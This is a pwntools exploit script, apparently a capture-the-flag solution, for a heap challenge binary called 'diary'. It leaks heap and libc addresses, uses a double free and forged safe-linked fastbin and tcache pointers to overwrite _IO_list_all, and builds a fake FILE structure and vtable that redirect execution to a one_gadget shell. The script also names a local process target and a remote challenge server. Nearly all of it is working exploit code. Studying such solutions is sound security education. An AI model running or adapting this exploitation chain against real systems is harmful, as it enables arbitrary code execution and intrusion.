from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc.so.6')
elf = ELF('./diary')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./diary')
else:
    io = remote('210.30.97.133',28068)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0x50a37,0xebcf1,0xebcf5,0xebcf5]

def new(idx,content = 'b\x00'):
    io.sendlineafter(b">>",str(1).encode())
    io.sendlineafter(b"Index: ",str(idx).encode())
    io.sendafter(b"Content: ",content)

def delete(idx):
    io.sendlineafter(b">>",str(2).encode())
    io.sendlineafter(b"Index: ",str(idx).encode())

def show(idx):
    io.sendlineafter(b">>",str(3).encode())
    io.sendlineafter(b"Index: ",str(idx).encode())

io.sendlineafter(b"How many pages do you want?",str(134).encode())

for i in range(25):
    new(i)

for i in range(8):
    delete(i)

show(1)
io.recvuntil(b"Content: ")
heap = u64(io.recvuntil(b'\n')[:-1] + b'\x00\x00')
#heap_arry = [heap >> 36, (heap >> 24) & 0xfff, (heap >> 12) & 0xfff,heap & 0xfff]
heap_arry = [heap >> 36,0,0,0]
heap_arry[2] = (heap & 0xfff) ^ 0x6e0
heap_arry[1] = heap_arry[2] ^ ( (heap >>12)&0xfff )

heap_base = (heap_arry[0] << 36) + (heap_arry[1] << 24) + (heap_arry[2] << 12)
success("heap_base -->" + hex(heap_base))
#p()

# fake fastbinlist
heap = heap_base >> 12
new(0,p64(0) * 4 + p64(heap) )
new(1, p64(0) * 4 + p64( (heap_base +0x870) ^ heap)  )
new(2, p64(0) * 4 + p64( (heap_base +0x830) ^ heap)  )
new(3,p64( (heap_base +0x730) ^ heap) + p64(0) *3 + p64( (heap_base +0x790) ^ heap) )
new(4)
new(5, p64(0) * 4 + p64( (heap_base +0x7f0) ^ heap)  )
new(6, p64(0) * 4 + p64( (heap_base +0x7b0) ^ heap)  )

delete(7) # 进tcache double free
new(7, p64( (heap_base +0x6f0) ^ heap)) # 改fastbin->fd
new(7)
#p()

new(30,p64(0) * 3 + p64(0x441))
delete(7)
show(7)
io.recvuntil(b"Content: ")
libc_base = u64(io.recvuntil(b'\n')[:-1] + b'\x00\x00') -  0x219ce0
success("libc_base -->" + hex(libc_base))
new(31)
new(32)
new(33)
io_list_all = libc_base + 0x21a680
target_addr = io_list_all
new(34,p64(0) * 4 + p64(target_addr ^ heap))
new(35)

#p()

# prepare fake vtable and fake wide_data_struct and fake file
# *(fake_vtable+0x68) = 指向需要调用函数的一个地址 而不是本身
unsortedchunk_header = heap_base + 0x890 
fake_FILE_addr = unsortedchunk_header + 0x10
wide_data_struct_addr = unsortedchunk_header + 0x20 - 0x10
lock = libc_base + 0x21ba60
_IO_wfile_over_flow = libc_base + 0x215f58
vtable_addr = heap_base + 0x9a0 -0x68  

new(36,p64(fake_FILE_addr))

payload = p64(0) *4 + p64(0x100) + p64(0)
new(37,payload)
new(38,p64(0) * 6)
new(39,p64(0) + p64(lock) + p64(0) *2 + p64(wide_data_struct_addr) + p64(0) )
new(40,p64(1) +  p64(0) * 2 + p64(_IO_wfile_over_flow -0x18) + p64(vtable_addr) )

new(41,p64(libc_base + one_gadget[1]) )
p()
io.sendlineafter(b">>",str(4).encode())


io.interactive()

